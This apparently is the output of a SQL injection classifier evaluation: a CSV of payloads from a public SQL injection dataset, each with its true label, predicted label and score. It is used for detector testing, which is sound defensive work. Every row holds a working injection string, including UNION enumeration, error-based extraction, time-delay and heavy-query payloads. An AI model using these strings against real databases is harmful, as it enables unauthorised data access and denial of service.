text,source,true_label,pred_label,score_sqli,correct
"1%'  )  )   or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8133616413223974,1
"1"" and elt ( 4249 = 4249,7259 )  and ""tmxx"" = ""tmxx",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3260047289710037,1
"-9672%""  )  )   )  order by 1#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.783844551796229,1
"-2717"" or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.965101988734748,1
"-1922%' )  union all select 2335,2335,2335,2335,2335,2335,2335,2335,2335,2335--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9086269222000972,1
"-7306"" or 2081 = 6847",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.8162380110916515,1
1 and  ( 1977 = 6852 ) *6852-- clxl,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.7084067704448126,1
"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  (  ""vqpx"" like ""vqpx",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1980870277466416,1
"1' )  and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( 'rvwk' = 'rvwk",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.713071222225241,1
"-9382' )  union all select 4774,4774,4774,4774--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.5016414884665235,1
-2372' or 1783 = 2656,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.7643220085636172,1
"1'  )  )   )  or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.1709575305062803,1
"1' )  where 6720 = 6720 or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.267054910502795,1
"1'  )  )   or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and   (  (  'mttj' like 'mttj",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,3.056847595005248,1
"1'  )  )   and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (  'vcvj' = 'vcvj",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2757039990240129,1
1' )  and 2305 = 1934,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.0428179616100341,1
"1' in boolean mode )  and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7049765696056047,1
"1'|| ( select 'alxi' where 3967 = 3967 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.942235303494992,1
"1'|| ( select 'dpje' where 2704 = 2704 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.9833411533512182,1
"1' )  or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.862920423911906,1
"1%' )  or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.163931557273155,1
-6327'  )  )   union all select 2685--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,4.695231711460158,1
"1  )  )   )  and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.5384621305833837,1
"1""  )  )   union all select null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,6.109320432932039,1
"1""  )  )   )  or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.0319679431984783,1
1' where 7613 = 7613,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1539285049176513,1
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and   (  (   ( 'leps' like 'leps",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2435495844795819,1
"1%""  )  )   and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and   (  (  ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.181040981493888,1
1 )  as zodp where 9112 = 9112,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1415001823778606,1
"1'+ ( select 'ngdk' where 7264 = 7264 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   ) +'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.3571491968407345,1
"1"" )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( ""eeye"" = ""eeye",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7976487205106726,1
"1' in boolean mode )  or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7117122850947908,1
"1""  )  )   )  union all select null#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,6.564382722122551,1
"1'  )  )   as lxjs where 6503 = 6503 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.2395239730209453,1
1' )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and  ( 'ulkq' = 'ulkq,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.741647758873258,1
"1%' )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and  ( '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8651461403699,1
1 rlike  ( select  ( case when  ( 8911 = 5301 )  then 1 else 0x28 end  )  )  # pmuh,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.2433784141003064,1
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (   ( 'juhi' like 'juhi",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1570382578805503,1
1 and 8398 = 1891-- naov,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9038335195129986,1
"1%""  )  )   and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (  ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7977948347089878,1
"1' where 3425 = 3425 and elt ( 4249 = 4249,7259 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.636116748857042,1
"1  )  )   )  union all select null,null,null#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,4.579470663903149,1
1'+ ( select nxfp where 5006 = 5006,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.73267033675523,1
"1'|| ( select 'eamo' where 4958 = 4958 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5  )  )  ||'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.2467064339814455,1
"1""  )  )   and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (  ""qyew"" = ""qyew",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8633204397979712,1
1' )  as dqgr where 2427 = 2427 and  ( 3020 = 3020 ) *6703--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7836577743240238,1
1'|| ( select 'uedy' where 8816 = 8816,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5793666333879894,1
"1'  )  )   as ylyq where 2953 = 2953 and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.406560758774833,1
1 where 4372 = 4372,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9401159514980285,1
"-9166"" )  as hlre where 4768 = 4768 or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5696212806510035,1
"-1256' in boolean mode )  union all select 7889,7889,7889,7889,7889,7889,7889,7889,7889--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3187823921521025,1
"1' or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4777071182656636,1
"1"" and  ( 3020 = 3020 ) *6703 and ""tnzp"" like ""tnzp",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.148411325815585,1
-4965 )  as imga where 3705 = 3705 union all select 3705--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.719405127678529,1
select  ( case when  ( 8208 = 7960 )  then 8208 else 8208* ( select 8208 from information_schema.character_sets )  end ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3393818510479432,1
"-4210"" )  where 2679 = 2679 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.9303855726536892,1
"1"" )  and  ( 4085 = 4885 ) *4885 and  ( ""sxte"" = ""sxte",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9271337912662433,1
"1'  )  )   )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.0385132186770556,1
"1%""  )  )   )  and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7549817960226246,1
"1'  )  )   as fusi where 2788 = 2788 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7665100844769905,1
"-9947""  )  )   )  union all select 8765,8765,8765,8765,8765#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.2155436690067534,1
1 )  as phja where 4627 = 4627,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1041333342207156,1
"1""  )  )   as gqxk where 9199 = 9199 and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.9207436295827884,1
1%' )  order by 1#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7299381568712238,1
1'  )  )   rlike sleep ( 5 ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.058140286025301,1
"1 or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3276120329338146,1
"1  )  )   ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and   (  (  1402 = 1402",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.377189093003224,1
1'  )  )   rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and   (  (  'trzi' = 'trzi,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.6410335225265182,1
"1""  )  )   and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (  ""uzbl"" = ""uzbl",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.0883494958902125,1
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and  ( ""gzhp"" = ""gzhp",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1192121278791909,1
select  ( case when  ( 3859 = 6938 )  then 3859 else 3859* ( select 3859 from mysql.db )  end ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1949764574386141,1
-7277  )  )   )  order by 1#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.620519675255479,1
"1 )  where 2888 = 2888 or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.50382739491755,1
1'  )  )   ),syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.71086269190298,1
"1 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) # tsxs",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2308720619801612,1
"1%""  )  )   and elt ( 3114 = 3114,sleep ( 5  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.1390204411273723,1
"1%"" or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.0846916596297396,1
1'|| ( select 'yezk' where 2097 = 2097,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5574916426865304,1
end ) ||',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.430825993193995,1
"1'  )  )   as fwxq where 9935 = 9935 or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.4872832537890304,1
"1"" )  and elt ( 1210 = 1210,sleep ( 5  )  )   and  ( ""cwwv"" like ""cwwv",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.0747330758131204,1
-2036' )  or  ( 8459 = 8459 ) *4906 and  ( 'hjeu' = 'hjeu,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4877379279444622,1
1'+ ( select hett where 7228 = 7228,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.0072809652728911,1
"1%"" )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and  ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5823618412446923,1
"1'|| ( select 'jzwq' where 3289 = 3289 union all select null,null,null,null,null,null,null#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.0848582059842937,1
"1%'  )  )   )  and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and   (  (   ( '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.1619600223497026,1
"-5617 )  where 2132 = 2132 union all select 2132,2132,2132,2132#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.9020926421877205,1
"1 )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and  ( 6986 = 6986",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.9307169890378701,1
1' )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and  ( 'xazf' = 'xazf,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.1322754158280097,1
"1"" )  as hymr where 5497 = 5497 union all select null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.6548846148777674,1
"1  )  )   )  or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.015063261241862,1
1 )  or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7094695987374644,1
"1' )  or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and  ( 'iifh' = 'iifh",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7058006838230293,1
"1 )  and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and  ( 9841 = 9841",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.196488122450817,1
-9562' or 8571 = 8571--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.0392800920157517,1
1' )  and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and  ( 'mqoj' like 'mqoj,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.3247960154623235,1
1 )  where 4992 = 4992,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.166961462078909,1
"1%""  )  )   and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (  ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.1963499255092045,1
"-8677'|| ( select 'ihpm' from dual where 9571 = 9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.7338932629646161,1
"1%""  )  )   )  or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.756488933852788,1
"-2790%"" )  union all select 5070,5070#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,3.76988580597759,1
1'|| ( select 'vpuh' where 8164 = 8164,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5563993264563907,1
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null  )  )  +'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.107577729839564,1
1 )  where 5651 = 5651,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1100184078983464,1
1  )  )   as ctqr where 2609 = 2609,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1668624435301473,1
1 )  where 4866 = 4866,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2896817419599658,1
"-4165"" where 1772 = 1772 union all select 1772,1772,1772,1772,1772,1772,1772,1772--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2432494777542789,1
"1""  )  )   )  or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and   (  (   ( ""tzqk"" like ""tzqk",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.007696584427131,1
"1%""  )  )   )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.2831776570529962,1
"1"" )  and 9198 = 9198--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.156889278743824,1
"1"" and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.196265920358405,1
"1' )  where 8948 = 8948 and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.4694052312301182,1
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and ""rbqs"" = ""rbqs",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4357343569603063,1
"1'  )  )   and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (  'hpbt' = 'hpbt",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.9133721175145686,1
select case when 8237 = 9948 then 1 else null end--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1815734505256708,1
"1' )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( 'qdsr' like 'qdsr",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7199484942161813,1
"1"" where 8234 = 8234",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.0750485903701867,1
"1  )  )   as qfnu where 1609 = 1609 and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.9737503919241126,1
"1"" )  or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.0808408273043648,1
1 )  where 9307 = 9307,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2786471131651558,1
"1'  )  )   or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (  'rdpv' = 'rdpv",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.169180111584434,1
1'  )  )   )  and 4069 = 8786 and   (  (   ( 'eftr' = 'eftr,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.9117246511498593,1
1' )  where 7903 = 7903,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3396258825302896,1
-4484'  )  )   or 6872 = 6872 and   (  (  'oxuo' = 'oxuo,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8305737086001144,1
"1%"" and 1343 = 5939#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9596812248393326,1
"1 )  as nfgb where 2503 = 2503 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,3.0353813013314914,1
-6100' )  as kvfc where 2377 = 2377 or 6872 = 6872--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7618066248452893,1
"1  )  )   and make_set ( 8403 = 8403,8899 )  and   (  (  4686 = 4686",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.684063422568157,1
